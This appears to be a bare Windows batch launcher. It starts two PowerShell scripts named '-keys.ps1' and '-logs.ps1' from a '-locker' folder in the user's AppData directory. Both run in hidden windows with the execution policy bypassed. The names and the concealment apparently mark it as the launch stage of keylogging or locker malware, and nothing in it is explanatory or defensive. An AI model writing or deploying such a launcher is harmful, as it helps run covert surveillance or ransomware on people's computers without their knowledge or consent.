@echo off
powershell Start-Process powershell.exe -windowstyle hidden -ExecutionPolicy bypass "$env:appdata/-locker/-keys.ps1"
powershell Start-Process powershell.exe -windowstyle hidden -ExecutionPolicy bypass "$env:appdata/-locker/-logs.ps1"
